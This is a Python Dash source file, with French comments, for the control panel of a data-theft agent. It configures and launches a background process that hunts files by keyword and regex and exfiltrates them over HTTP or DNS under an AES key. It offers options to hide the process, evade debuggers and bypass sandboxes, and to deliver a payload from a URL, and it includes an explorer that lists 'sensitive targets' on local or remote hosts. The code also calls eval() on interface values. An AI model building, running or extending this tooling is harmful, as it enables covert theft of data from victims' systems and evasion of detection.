# --- CALLBACKS DE SYNCHRONISATION : Input Visible --> Hidden Input ---
# Ces callbacks transfèrent les valeurs des inputs visibles vers des inputs cachés
# pour assurer la persistance de l'état entre les onglets et la gestion des callbacks.

@app.callback(Output('target-url-hidden', 'value', allow_duplicate=True), Input('target-url', 'value'), prevent_initial_call=True)
def _update_hidden_target_url(value): return value

@app.callback(Output('scan-path-hidden', 'value', allow_duplicate=True), Input('scan-path', 'value'), prevent_initial_call=True)
def _update_hidden_scan_path(value): return value

@app.callback(Output('aes-key-hidden', 'value', allow_duplicate=True), Input('aes-key', 'value'), prevent_initial_call=True)
def _update_hidden_aes_key(value): return value

@app.callback(Output('exfil-method-hidden', 'value', allow_duplicate=True), Input('exfil-method', 'value'), prevent_initial_call=True)
def _update_hidden_exfil_method(value): return value

@app.callback(Output('dns-server-hidden', 'value', allow_duplicate=True), Input('dns-server', 'value'), prevent_initial_call=True)
def _update_hidden_dns_server(value): return value

@app.callback(Output('dns-domain-hidden', 'value', allow_duplicate=True), Input('dns-domain', 'value'), prevent_initial_call=True)
def _update_hidden_dns_domain(value): return value

@app.callback(Output('file-types-hidden', 'value', allow_duplicate=True), Input('file-types', 'value'), prevent_initial_call=True)
def _update_hidden_file_types(value): return value

@app.callback(Output('exclude-types-hidden', 'value', allow_duplicate=True), Input('exclude-types', 'value'), prevent_initial_call=True)
def _update_hidden_exclude_types(value): return value

@app.callback(Output('min-size-hidden', 'value', allow_duplicate=True), Input('min-size', 'value'), prevent_initial_call=True)
def _update_hidden_min_size(value): return value

@app.callback(Output('max-size-hidden', 'value', allow_duplicate=True), Input('max-size', 'value'), prevent_initial_call=True)
def _update_hidden_max_size(value): return value

@app.callback(Output('keywords-hidden', 'value', allow_duplicate=True), Input('keywords', 'value'), prevent_initial_call=True)
def _update_hidden_keywords(value): return value

@app.callback(Output('regex-patterns-hidden', 'value', allow_duplicate=True), Input('regex-patterns', 'value'), prevent_initial_call=True)
def _update_hidden_regex_patterns(value): return value


# Les callbacks _sync_payload_url_to_hidden et _sync_payload_path_to_hidden ont été supprimés d'ici.
# Leur logique a été déplacée dans render_tab_content.


# --- Le callback apply_and_save_single_setting va maintenant gérer TOUS les boutons apply,
# et lire les valeurs depuis les hidden inputs, qui sont eux-mêmes mis à jour par les callbacks _sync_..._to_hidden ---
# NOTE: L'Input sur ALL n_clicks avec MATCH sur State est la façon correcte de gérer
# les boutons générés dynamiquement. Cela garantit que l'ID du bouton cliqué est disponible
# et que le callback ne se déclenche que si un bouton est effectivement cliqué.
@app.callback(
    Output({'type': 'apply-button', 'input_id': MATCH}, 'style'),
    Input({'type': 'apply-button', 'input_id': ALL}, 'n_clicks'), # Changed MATCH to ALL
    State({'type': 'apply-button', 'input_id': MATCH}, 'id'), # Keep MATCH for State to identify WHICH button was clicked
    State('target-url-hidden', 'value'), State('scan-path-hidden', 'value'), State('aes-key-hidden', 'value'),
    State('exfil-method-hidden', 'value'), State('dns-server-hidden', 'value'), State('dns-domain-hidden', 'value'),
    State('file-types-hidden', 'value'), State('exclude-types-hidden', 'value'), State('min-size-hidden', 'value'),
    State('max-size-hidden', 'value'), State('keywords-hidden', 'value'), State('regex-patterns-hidden', 'value'),
    # Utiliser les versions cachées pour la sauvegarde de la config
    State('payload-url-hidden', 'value'), State('payload-path-hidden', 'value'), State('threads-hidden', 'value'),
    State('debug-mode-hidden', 'value'), State('no-clean-hidden', 'value'), State('no-anti-evasion-hidden', 'value'),
    State('explorer-target-host-hidden', 'value'),
    State('explorer-base-path-hidden', 'value'),
    State('explorer-max-depth-hidden', 'value'),
    State('stealth-hide-process-hidden', 'value'),
    State('stealth-anti-debug-hidden', 'value'),
    State('stealth-sandbox-bypass-hidden', 'value'),
    prevent_initial_call=True
)
def apply_and_save_single_setting(n_clicks_list, button_id, # n_clicks is now a list
                                  target_url, scan_path, aes_key, exfil_method, dns_server, dns_domain,
                                  file_types, exclude_types, min_size, max_size, keywords, regex_patterns,
                                  payload_url, payload_path, threads, debug_mode_val_str, no_clean_val_str, no_anti_evasion_val_str,
                                  explorer_target_host, explorer_base_path, explorer_max_depth,
                                  stealth_hide_process_val_str, stealth_anti_debug_val_str, stealth_sandbox_bypass_val_str):
    
    ctx = dash.callback_context
    if not ctx.triggered:
        return dash.no_update

    # Trouver quel bouton a déclenché le callback en utilisant ctx.triggered_id
    trigger_input_id_dict = ctx.triggered_id # C'est déjà le dictionnaire de l'ID dynamique
    
    # S'assurer que le déclencheur est bien un bouton APPLY et qu'il y a eu un clic valide
    if trigger_input_id_dict.get('type') != 'apply-button':
        return dash.no_update

    # Optionnel: Récupérer le n_clicks spécifique pour le bouton cliqué si nécessaire pour d'autres logiques.
    # Dans ce cas, comme le callback ne se déclenche qu'au clic, on sait qu'un clic valide s'est produit.
    # Et on ne réinitialise pas le style pour les autres boutons.

    # print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [DEBUG] Apply button clicked for: {trigger_input_id_dict['input_id']}") # Pour débogage

    debug_mode_val = eval(debug_mode_val_str) if isinstance(debug_mode_val_str, str) else debug_mode_val_str
    no_clean_val = eval(no_clean_val_str) if isinstance(no_clean_val_str, str) else no_clean_val_str
    no_anti_evasion_val = eval(no_anti_evasion_val_str) if isinstance(no_anti_evasion_val_str, str) else no_anti_evasion_val_str
    stealth_hide_process_val = eval(stealth_hide_process_val_str) if isinstance(stealth_hide_process_val_str, str) else stealth_hide_process_val_str
    stealth_anti_debug_val = eval(stealth_anti_debug_val_str) if isinstance(stealth_anti_debug_val_str, str) else stealth_anti_debug_val_str
    stealth_sandbox_bypass_val = eval(stealth_sandbox_bypass_val_str) if isinstance(stealth_sandbox_bypass_val_str, str) else stealth_sandbox_bypass_val_str


    config_to_save = {
        "aes_key": aes_key, "default_target_url": target_url, "default_scan_path": scan_path,
        "default_file_types": file_types, "default_exclude_types": exclude_types,
        "default_min_size": min_size, "default_max_size": max_size,
        "default_dns_server": dns_server, "default_dns_domain": dns_domain,
        "default_keywords": keywords, "default_regex_patterns": regex_patterns,
        "default_payload_url": payload_url, "default_payload_path": payload_path,
        "default_threads": threads,
        "default_debug_mode": debug_mode_val,
        "default_no_clean": no_clean_val,
        "default_no_anti_evasion": no_anti_evasion_val,
        "default_explorer_target_host": explorer_target_host,
        "default_explorer_base_path": explorer_base_path,
        "default_explorer_depth": explorer_max_depth, # Use explorer_max_depth here
        "default_exfil_method": exfil_method,
        "default_stealth_hide_process": stealth_hide_process_val,
        "default_stealth_anti_debug": stealth_anti_debug_val,
        "default_stealth_sandbox_bypass": stealth_sandbox_bypass_val,
    }
    save_shared_config(config_to_save)

    # Retourne le style activé pour le bouton cliqué (button_id est l'ID dynamique du bouton cliqué)
    return CYBER_BUTTON_APPLY_ACTIVE


@app.callback(
    Output('save-config-button', 'children'),
    Input('save-config-button', 'n_clicks'),
    State('target-url-hidden', 'value'), State('scan-path-hidden', 'value'), State('aes-key-hidden', 'value'),
    State('exfil-method-hidden', 'value'), State('dns-server-hidden', 'value'), State('dns-domain-hidden', 'value'),
    State('file-types-hidden', 'value'), State('exclude-types-hidden', 'value'), State('min-size-hidden', 'value'),
    State('max-size-hidden', 'value'), State('keywords-hidden', 'value'), State('regex-patterns-hidden', 'value'),
    # FIX: Utiliser les versions cachées pour la sauvegarde de la config
    State('payload-url-hidden', 'value'), State('payload-path-hidden', 'value'), State('threads-hidden', 'value'),
    State('debug-mode-hidden', 'value'), State('no-clean-hidden', 'value'), State('no-anti-evasion-hidden', 'value'),
    State('explorer-target-host-hidden', 'value'),
    State('explorer-base-path-hidden', 'value'),
    State('explorer-max-depth-hidden', 'value'),
    State('stealth-hide-process-hidden', 'value'),
    State('stealth-anti-debug-hidden', 'value'),
    State('stealth-sandbox-bypass-hidden', 'value'),
    prevent_initial_call=True
)
def save_config_final(n_clicks,
                      target_url, scan_path, aes_key, exfil_method, dns_server, dns_domain,
                      file_types, exclude_types, min_size, max_size, keywords, regex_patterns,
                      payload_url, payload_path, threads, debug_mode_val_str, no_clean_val_str, no_anti_evasion_val_str,
                      explorer_target_host, explorer_base_path, explorer_max_depth,
                      stealth_hide_process_val_str, stealth_anti_debug_val_str, stealth_sandbox_bypass_val_str):
    if n_clicks == 0:
        return "SAVE ALL CONFIG"

    debug_mode_val = eval(debug_mode_val_str) if isinstance(debug_mode_val_str, str) else debug_mode_val_str
    no_clean_val = eval(no_clean_val_str) if isinstance(no_clean_val_str, str) else no_clean_val_str
    no_anti_evasion_val = eval(no_anti_evasion_val_str) if isinstance(no_anti_evasion_val_str, str) else no_anti_evasion_val_str
    stealth_hide_process_val = eval(stealth_hide_process_val_str) if isinstance(stealth_hide_process_val_str, str) else stealth_hide_process_val_str
    stealth_anti_debug_val = eval(stealth_anti_debug_val_str) if isinstance(stealth_anti_debug_val_str, str) else stealth_anti_debug_val_str
    stealth_sandbox_bypass_val = eval(stealth_sandbox_bypass_val_str) if isinstance(stealth_sandbox_bypass_val_str, str) else stealth_sandbox_bypass_val_str


    config_to_save = {
        "aes_key": aes_key, "default_target_url": target_url, "default_scan_path": scan_path,
        "default_file_types": file_types, "default_exclude_types": exclude_types,
        "default_min_size": min_size, "default_max_size": max_size,
        "default_dns_server": dns_server, "default_dns_domain": dns_domain,
        "default_keywords": keywords, "default_regex_patterns": regex_patterns,
        "default_payload_url": payload_url, "default_payload_path": payload_path,
        "default_threads": threads,
        "default_debug_mode": debug_mode_val,
        "default_no_clean": no_clean_val,
        "default_no_anti_evasion": no_anti_evasion_val,
        "default_explorer_target_host": explorer_target_host,
        "default_explorer_base_path": explorer_base_path,
        "default_explorer_depth": explorer_max_depth, # Use explorer_max_depth here
        "default_exfil_method": exfil_method,
        "default_stealth_hide_process": stealth_hide_process_val,
        "default_stealth_anti_debug": stealth_anti_debug_val,
        "default_stealth_sandbox_bypass": stealth_sandbox_bypass_val,
    }
    save_shared_config(config_to_save)
    return "CONFIG SAVED!"


@app.callback(
    # FIX: L'Output 'command-output' est renommé 'live-log-stream-display-buffer'
    Output('live-log-stream-display-buffer', 'children', allow_duplicate=True), # L'output global doit être un élément caché
    Output('agent-stats-store', 'data', allow_duplicate=True),
    Input('launch-button', 'n_clicks'),
    State('target-url-hidden', 'value'), State('scan-path-hidden', 'value'), State('aes-key-hidden', 'value'),
    State('exfil-method-hidden', 'value'), State('dns-server-hidden', 'value'), State('dns-domain-hidden', 'value'),
    State('file-types-hidden', 'value'), State('exclude-types-hidden', 'value'), State('min-size-hidden', 'value'),
    State('max-size-hidden', 'value'), State('keywords-hidden', 'value'), State('regex-patterns-hidden', 'value'),
    State('payload-url-hidden', 'value'), State('payload-path-hidden', 'value'), State('threads-hidden', 'value'),
    State('debug-mode-hidden', 'value'), State('no-clean-hidden', 'value'), State('no-anti-evasion-hidden', 'value'),
    State('agent-stats-store', 'data'),
    State('stealth-hide-process-hidden', 'value'),
    State('stealth-anti-debug-hidden', 'value'),
    State('stealth-sandbox-bypass-hidden', 'value'),
    prevent_initial_call=True
)
def launch_agent(n_clicks, target_url, scan_path, aes_key, exfil_method, dns_server, dns_domain,
                 file_types, exclude_types, min_size, max_size, keywords, regex_patterns,
                 payload_url, payload_path, threads, debug_mode_val_str, no_clean_val_str, no_anti_evasion_val_str,
                 current_stats,
                 stealth_hide_process_val_str, stealth_anti_debug_val_str, stealth_sandbox_bypass_val_str):
    global running_agent_process

    if n_clicks == 0: return dash.no_update, current_stats
    if running_agent_process and running_agent_process.poll() is None:
        return html.Pre("ERROR: AGENT ALREADY RUNNING. STOP IT FIRST.", style=CYBER_STATUS_ERROR), current_stats
    if not target_url or not aes_key:
        return html.Pre("ERROR: TARGET URL AND AES KEY ARE MANDATORY.", style=CYBER_STATUS_ERROR), current_stats
    if exfil_method == 'dns' and (not dns_server or not dns_domain):
        return html.Pre("ERROR: DNS SERVER AND DOMAIN ARE MANDATORY FOR DNS EXFILTRATION.", style=CYBER_STATUS_ERROR), current_stats

    command = [sys.executable, AGENT_PATH]
    command.extend(["--target", target_url, "--scan", scan_path, "--key", aes_key, "--method", exfil_method])
    if exfil_method == 'dns': command.extend(["--dns-server", dns_server, "--dns-domain", dns_domain])
    if file_types: command.extend(["--types", file_types])
    if exclude_types: command.extend(["--exclude-types", exclude_types])
    if min_size: command.extend(["--min-size", str(min_size)])
    if max_size: command.extend(["--max-size", str(max_size)])
    if keywords: command.extend(["--keywords", keywords])
    if regex_patterns: command.extend(["--regex-patterns", regex_patterns])
    if payload_url: command.extend(["--payload-url", payload_url])
    if payload_path: command.extend(["--payload-path", payload_path])
    if threads: command.extend(["--threads", str(threads)])

    debug_mode_list = eval(debug_mode_val_str) if isinstance(debug_mode_val_str, str) else debug_mode_val_str
    no_clean_list = eval(no_clean_val_str) if isinstance(no_clean_val_str, str) else no_clean_val_str
    no_anti_evasion_list = eval(no_anti_evasion_val_str) if isinstance(no_anti_evasion_val_str, str) else no_anti_evasion_val_str
    
    stealth_hide_process_list = eval(stealth_hide_process_val_str) if isinstance(stealth_hide_process_val_str, str) else stealth_hide_process_val_str
    stealth_anti_debug_list = eval(stealth_anti_debug_val_str) if isinstance(stealth_anti_debug_val_str, str) else stealth_anti_debug_val_str
    stealth_sandbox_bypass_list = eval(stealth_sandbox_bypass_val_str) if isinstance(stealth_sandbox_bypass_val_str, str) else stealth_sandbox_bypass_val_str


    if 'debug' in debug_mode_list: command.append("--debug")
    if 'no-clean' in no_clean_list: command.append("--no-clean")
    if 'no-anti-evasion' in no_anti_evasion_list: command.append("--no-anti-evasion")

    if 'hide_process' in stealth_hide_process_list: command.append("--hide-process")
    if 'anti_debug' in stealth_anti_debug_list: command.append("--anti-debug")
    if 'sandbox_bypass' in stealth_sandbox_bypass_list: command.append("--sandbox-bypass")

    full_command_str = shlex.join(command)
    _GLOBAL_MODULE_LOGGER.log_info(f"INITIATING COMMAND:\n{full_command_str}")
    _GLOBAL_MODULE_LOGGER.log_info("--- AGENT STARTING (CHECK LOGS FOR DETAILS) ---")

    try:
        running_agent_process = subprocess.Popen(command,
                                                 stdout=subprocess.DEVNULL,
                                                 stderr=subprocess.DEVNULL,
                                                 cwd=AGENT_DIR,
                                                 preexec_fn=os.setsid
                                                 )
        status_message = (
            f"[INFO] AGENT LAUNCHED PID: {running_agent_process.pid}\n"
            f"[INFO] AGENT RUNNING IN BACKGROUND.\n"
            f"[INFO] USE 'REFRESH ENCRYPTED LOGS' BUTTON TO MONITOR ACTIVITY.\n"
            f"[INFO] MONITOR LIVE LOGS IN 'DASHBOARD' OR 'LOGS & STATUS' TABS."
        )
        _GLOBAL_MODULE_LOGGER.log_info(status_message)

        current_stats['agent_status'] = 'RUNNING'
        current_stats['agent_start_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        current_stats['files_scanned'] = 0
        current_stats['files_matched'] = 0
        current_stats['data_exfiltrated_bytes'] = 0
        current_stats['exfil_success_count'] = 0
        current_stats['exfil_failed_count'] = 0
        current_stats['agent_last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Le retour pour l'Output doit être l'élément PRE, pas seulement le string de message
        return html.Pre(status_message, style=CYBER_STATUS_BOX_STYLE), current_stats

    except FileNotFoundError:
        error_msg = f"ERROR: AGENT SCRIPT '{AGENT_PATH}' NOT FOUND."
        _GLOBAL_MODULE_LOGGER.log_error(error_msg)
        current_stats['agent_status'] = 'ERROR'
        current_stats['agent_last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        return html.Pre(error_msg, style=CYBER_STATUS_ERROR), current_stats
    except Exception as e:
        error_msg = f"ERROR LAUNCHING AGENT: {e}"
        _GLOBAL_MODULE_LOGGER.log_critical(error_msg)
        current_stats['agent_status'] = 'ERROR'
        current_stats['agent_last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        return html.Pre(error_msg, style=CYBER_STATUS_ERROR), current_stats

@app.callback(
    Output('stop-button', 'children'),
    Output('agent-stats-store', 'data', allow_duplicate=True),
    Input('stop-button', 'n_clicks'),
    State('agent-stats-store', 'data'),
    prevent_initial_call=True
)
def stop_agent(n_clicks, current_stats):
    global running_agent_process
    if n_clicks == 0: return dash.no_update, current_stats
    if running_agent_process and running_agent_process.poll() is None:
        try:
            os.killpg(os.getpgid(running_agent_process.pid), signal.SIGINT)
            time.sleep(2)
            if running_agent_process.poll() is None: running_agent_process.terminate()
            time.sleep(1)
            if running_agent_process.poll() is None: running_agent_process.kill()
            running_agent_process = None
            status_msg = "AGENT TERMINATED."
            _GLOBAL_MODULE_LOGGER.log_info(status_msg)
            
            current_stats['agent_status'] = 'TERMINATED'
            current_stats['agent_last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            return status_msg, current_stats
        except ProcessLookupError:
            running_agent_process = None
            status_msg = "AGENT ALREADY TERMINATED OR NOT FOUND."
            _GLOBAL_MODULE_LOGGER.log_warning(status_msg)
            current_stats['agent_status'] = 'INACTIVE'
            current_stats['agent_last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            return status_msg, current_stats
        except Exception as e:
            error_msg = f"ERROR TERMINATING AGENT: {e}"
            _GLOBAL_MODULE_LOGGER.log_critical(error_msg)
            current_stats['agent_status'] = 'ERROR'
            current_stats['agent_last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            return html.Pre(error_msg, style=CYBER_STATUS_ERROR), current_stats
    else:
        status_msg = "NO AGENT RUNNING."
        _GLOBAL_MODULE_LOGGER.log_info(status_msg)
        current_stats['agent_status'] = 'INACTIVE'
        current_stats['agent_last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        return status_msg, current_stats

@app.callback(
    Output('decrypted-logs-output', 'children'),
    Input('refresh-logs-button', 'n_clicks'),
    State('aes-key-hidden', 'value'),
    prevent_initial_call=True
)
def refresh_decrypted_logs(n_clicks, aes_key_for_decrypt):
    if n_clicks == 0: return "DECRYPTED LOGS (IF AVAILABLE)..."
    if AES256Cipher is None:
        error_msg = "DECRYPTION FUNCTION NOT AVAILABLE (AES256Cipher module not imported)."
        _GLOBAL_MODULE_LOGGER.log_error(error_msg)
        return html.Pre(error_msg, style=CYBER_STATUS_ERROR)
    
    temp_log_cipher = None
    if aes_key_for_decrypt:
        try: temp_log_cipher = AES256Cipher(aes_key_for_decrypt)
        except Exception: 
            error_msg = "ERROR: INVALID AES KEY FOR LOG DECRYPTION. PLEASE VERIFY KEY."
            _GLOBAL_MODULE_LOGGER.log_error(error_msg)
            return html.Pre(error_msg, style=CYBER_STATUS_ERROR)
    else: 
        error_msg = "PLEASE PROVIDE AES KEY ABOVE TO DECRYPT LOGS."
        _GLOBAL_MODULE_LOGGER.log_warning(error_msg)
        return html.Pre(error_msg, style=CYBER_STATUS_ERROR)
    
    if not temp_log_cipher: 
        error_msg = "FAILED TO INITIALIZE LOG DECRYPTOR WITH PROVIDED KEY."
        _GLOBAL_MODULE_LOGGER.log_error(error_msg)
        return html.Pre(error_msg, style=CYBER_STATUS_ERROR)

    try:
        reader_logger_class = globals().get('AgentLogger', None) 
        if reader_logger_class is None:
            error_msg = "AgentLogger class not available for reading encrypted logs."
            _GLOBAL_MODULE_LOGGER.log_error(error_msg)
            return html.Pre(error_msg, style=CYBER_STATUS_ERROR)

        reader_logger = reader_logger_class(LOG_FILE_PATH, aes_key_for_decrypt, debug_mode=True, stdout_enabled=False)
        
        if hasattr(reader_logger, 'read_and_decrypt_logs'):
            logs = reader_logger.read_and_decrypt_logs()
        else:
            error_msg = "Logger does not support reading encrypted logs. (Missing feature in AgentLogger)."
            _GLOBAL_MODULE_LOGGER.log_warning(error_msg)
            return html.Pre(error_msg, style=CYBER_STATUS_WARNING)

        if not logs:
            status_msg = "NO DECRYPTABLE LOGS FOUND OR LOGS UNREADABLE/UNCIPHERABLE. HAS AGENT RUN YET?"
            _GLOBAL_MODULE_LOGGER.log_warning(status_msg)
            return html.Pre(status_msg, style=CYBER_STATUS_WARNING)
        
        formatted_logs = []
        for entry in logs:
            formatted_logs.append(f"[{entry.get('timestamp', 'N/A')}] {entry.get('level', 'N/A')}: {entry.get('message', 'N/A')}")
        
        _GLOBAL_MODULE_LOGGER.log_info("Logs chiffrés rafraîchis et déchiffrés.")
        return html.Pre("\n".join(formatted_logs), style={**CYBER_STATUS_BOX_STYLE, 'color': '#7FFF00'})
    except Exception as e:
        error_msg = f"ERROR REFRESHING/DECRYPTING LOGS: {e}. IS AES KEY CORRECT OR LOG FILE CORRUPTED?"
        _GLOBAL_MODULE_LOGGER.log_critical(error_msg)
        return html.Pre(error_msg, style=CYBER_STATUS_ERROR)

@app.callback(Output("download-logs-data", "data"), Input("download-logs-button", "n_clicks"), prevent_initial_call=True)
def download_logs(n_clicks):
    if os.path.exists(LOG_FILE_PATH):
        try:
            with open(LOG_FILE_PATH, "rb") as f: content = f.read()
            _GLOBAL_MODULE_LOGGER.log_info("Téléchargement des logs bruts demandé.")
            return dcc.send_bytes(content, "agent_logs_encrypted.enc")
        except Exception as e: 
            error_msg = f"ERROR READING LOG FILE FOR DOWNLOAD: {e}"
            _GLOBAL_MODULE_LOGGER.log_error(error_msg)
            return html.Pre(error_msg, style=CYBER_STATUS_ERROR)
    return None

# --- Callbacks pour l'explorateur de fichiers ---

@app.callback(
    [Output('explorer-status', 'children'),
     Output('found-files-table', 'data'),
     Output('file-content-output', 'children')],
    [Input('launch-explorer-button', 'n_clicks'),
     Input({'type': 'read-file-button', 'index': ALL}, 'n_clicks')],
    [State('explorer-target-host-hidden', 'value'),
     State('explorer-base-path-hidden', 'value'),
     State('explorer-max-depth-hidden', 'value'),
     State('found-files-table', 'data')],
    prevent_initial_call=True
)
def handle_explorer_actions(launch_n_clicks, read_n_clicks_list, target_host, base_path, max_depth, table_data):
    ctx = dash.callback_context

    if not ctx.triggered:
        raise dash.exceptions.PreventUpdate

    trigger_id = ctx.triggered[0]['prop_id']

    if 'launch-explorer-button' in trigger_id:
        # Nettoyer les logs de l'explorateur au début d'une nouvelle exploration
        if global_log_streamer: global_log_streamer.clear_logs() # Ceci affecte tous les logs passés
        explorer_log_states['file_explorer']['logs'] = [] # Réinitialise le buffer local
        explorer_log_states['file_explorer']['last_index'] = 0

        _GLOBAL_MODULE_LOGGER.log_info("Démarrage de l'exploration via l'interface.")

        if isinstance(global_file_explorer, BaseMockExplorer) or isinstance(global_web_explorer, BaseMockExplorer):
            _GLOBAL_MODULE_LOGGER.log_error("Explorer modules not loaded (using mock implementations). Check server console for import errors.")
            return html.Pre("ERROR: Explorer modules not loaded (using mock implementations). Check server console for import errors.", style=CYBER_STATUS_ERROR), [], "SELECTED FILE CONTENT..."

        if not target_host and not base_path:
            _GLOBAL_MODULE_LOGGER.log_error("Either TARGET HOST (URL/IP) or BASE PATH is mandatory for exploration.")
            return html.Pre("ERROR: Either TARGET HOST (URL/IP) or BASE PATH is mandatory for exploration.", style=CYBER_STATUS_ERROR), [], "SELECTED FILE CONTENT..."

        if max_depth is None or max_depth < 0:
            _GLOBAL_MODULE_LOGGER.log_error("Please specify a valid MAX DEPTH (integer >= 0).")
            return html.Pre("ERROR: PLEASE SPECIFY A VALID MAX DEPTH (INTEGER >= 0).", style=CYBER_STATUS_ERROR), [], "SELECTED FILE CONTENT..."

        global_file_explorer.reset_state()
        global_web_explorer.reset_state()

        is_web_exploration = False
        # Logique pour déterminer si c'est une exploration web
        if target_host and (target_host.startswith("http://") or target_host.startswith("https://") or
                           (re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", target_host) and not base_path) or
                           (re.match(r"^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", target_host) and '/' not in target_host and not base_path)):
            is_web_exploration = True
            if not target_host.startswith("http"):
                target_host = "http://" + target_host


        found_targets = []
        status_message = ""

        try:
            if is_web_exploration:
                target_url_for_web = target_host
                if base_path:
                    from urllib.parse import urljoin
                    target_url_for_web = urljoin(target_host, base_path.lstrip('/'))

                status_message = html.Pre(f"INITIATING WEB EXPLORATION OF '{target_url_for_web}' (Depth: {max_depth})...", style=CYBER_STATUS_INFO)
                _GLOBAL_MODULE_LOGGER.log_info(f"Initiating web exploration of '{target_url_for_web}' (Depth: {max_depth})...")
                found_targets = global_web_explorer.explore_url(target_url_for_web, max_depth)

            else:
                if not base_path:
                     _GLOBAL_MODULE_LOGGER.log_error("For local exploration, a BASE PATH is required.")
                     return html.Pre("ERROR: For local exploration, a BASE PATH is required.", style=CYBER_STATUS_ERROR), [], "SELECTED FILE CONTENT..."

                if not os.path.isdir(base_path):
                    _GLOBAL_MODULE_LOGGER.log_error(f"LOCAL BASE PATH '{base_path}' DOES NOT EXIST OR IS NOT A DIRECTORY.")
                    return html.Pre(f"ERROR: LOCAL BASE PATH '{base_path}' DOES NOT EXIST OR IS NOT A DIRECTORY.", style=CYBER_STATUS_ERROR), [], "SELECTED FILE CONTENT..."

                status_message = html.Pre(f"INITIATING LOCAL FILE EXPLORATION OF '{base_path}' (Depth: {max_depth})...", style=CYBER_STATUS_INFO)
                _GLOBAL_MODULE_LOGGER.log_info(f"Initiating local file exploration of '{base_path}' (Depth: {max_depth})...")
                found_targets = global_file_explorer.explore_path(base_path, max_depth)

            if not found_targets:
                final_status = html.Pre(f"EXPLORATION COMPLETE. NO SENSITIVE TARGETS FOUND.", style=CYBER_STATUS_WARNING)
            else:
                final_status = html.Pre(f"EXPLORATION COMPLETE. {len(found_targets)} SENSITIVE TARGETS FOUND.", style=CYBER_STATUS_BOX_STYLE)
            _GLOBAL_MODULE_LOGGER.log_info(final_status.children)

            table_data = []
            file_type_enum = OriginalFileExplorer.TARGET_TYPE_FILE if not is_web_exploration else OriginalWebExplorer.TARGET_TYPE_FILE
            dir_type_enum = OriginalFileExplorer.TARGET_TYPE_DIRECTORY if not is_web_exploration else OriginalWebExplorer.TARGET_TYPE_DIRECTORY

            for i, item in enumerate(found_targets):
                actions_html_children = []

                is_actionable_file = False
                if item['type'] == file_type_enum:
                    is_actionable_file = True

                if is_actionable_file:
                    read_button_id = json.dumps({'type': 'read-file-button', 'index': i, 'source': 'local' if not is_web_exploration else 'web'})
                    download_button_id = json.dumps({'type': 'download-file-button', 'index': i, 'source': 'local' if not is_web_exploration else 'web'})

                    actions_html_children.append(
                        html.Button('READ', id=read_button_id, n_clicks=0, style=CYBER_ACTION_BUTTON_TABLE_STYLE)
                    )
                    actions_html_children.append(
                        html.Button('DOWNLOAD', id=download_button_id, n_clicks=0, style=CYBER_DOWNLOAD_BUTTON_TABLE_STYLE)
                    )
                elif item['type'] == dir_type_enum:
                    actions_html_children.append(
                        html.Span("DIR", style={'color': '#FF00FF', 'fontWeight': 'bold'})
                    )

                table_data.append({
                    "path": item['path'],
                    "full_path": item['full_path'],
                    "type": item['type'],
                    "sensitive_match": item['sensitive_match'],
                    "actions": html.Div(actions_html_children).to_plotly_json()
                })

            return final_status, table_data, html.Pre("SELECTED FILE CONTENT (Hex/Text preview)...", style=CYBER_STATUS_WARNING)

        except Exception as e:
            import traceback
            error_trace = traceback.format_exc()
            _GLOBAL_MODULE_LOGGER.log_critical(f"ERROR EXPLORING: {e}\n{error_trace}")
            return html.Pre(f"ERROR EXPLORING: {e}\n{error_trace}", style=CYBER_STATUS_ERROR), [], html.Pre("SELECTED FILE CONTENT (Hex/Text preview)...", style=CYBER_STATUS_WARNING)

    elif 'read-file-button' in trigger_id:
        button_id_dict = json.loads(trigger_id)
        clicked_index = button_id_dict['index']
        source_type = button_id_dict.get('source', 'local')

        if clicked_index is not None and clicked_index < len(table_data):
            file_item = table_data[clicked_index]
            file_full_path = file_item.get('full_path')

            if file_full_path:
                content = ""
                try:
                    if source_type == 'local' and not isinstance(global_file_explorer, BaseMockExplorer):
                        content = global_file_explorer.read_file_content(file_full_path)
                    elif source_type == 'web' and not isinstance(global_web_explorer, BaseMockExplorer):
                        content = global_web_explorer.read_file_content_from_url(file_full_path)
                    else:
                        _GLOBAL_MODULE_LOGGER.log_error(f"Explorer for '{source_type}' not available or in mock mode.")
                        return dash.no_update, dash.no_update, html.Pre("ERROR: Explorer not available for this source type or in mock mode.", style=CYBER_STATUS_ERROR)

                    _GLOBAL_MODULE_LOGGER.log_info(f"Reading content of '{file_item['path']}'.")
                    return dash.no_update, dash.no_update, html.Pre(f"CONTENT OF '{file_item['path']}':\n\n{content}", style=CYBER_STATUS_WARNING)
                except Exception as e:
                    _GLOBAL_MODULE_LOGGER.log_error(f"Error reading file content '{file_full_path}': {e}")
                    return dash.no_update, dash.no_update, html.Pre(f"ERROR READING FILE CONTENT: {e}", style=CYBER_STATUS_ERROR)

            _GLOBAL_MODULE_LOGGER.log_error("FILE PATH NOT FOUND IN TABLE DATA for read action.")
            return dash.no_update, dash.no_update, html.Pre("FILE PATH NOT FOUND IN TABLE DATA.", style=CYBER_STATUS_ERROR)
        return dash.no_update, dash.no_update, dash.no_update


@app.callback(
    Output('explorer-status', 'children', allow_duplicate=True),
    Output('found-files-table', 'data', allow_duplicate=True),
    Output('file-content-output', 'children', allow_duplicate=True),
    Input('stop-explorer-button', 'n_clicks'),
    prevent_initial_call=True
)
def stop_explorer(n_clicks):
    if n_clicks > 0:
        _GLOBAL_MODULE_LOGGER.log_info("Arrêt de l'exploration demandé par l'utilisateur.")
        global_file_explorer.reset_state()
        global_web_explorer.reset_state()
        if global_log_streamer: global_log_streamer.clear_logs() # Ceci affecte tous les logs passés
        explorer_log_states['file_explorer']['logs'] = [] # Réinitialise le buffer local
        explorer_log_states['file_explorer']['last_index'] = 0

        return (
            html.Pre("EXPLORATION TERMINATED BY USER. RESULTS CLEARED.", style=CYBER_STATUS_INFO),
            [],
            html.Pre("SELECTED FILE CONTENT (Hex/Text preview)...", style=CYBER_STATUS_WARNING)
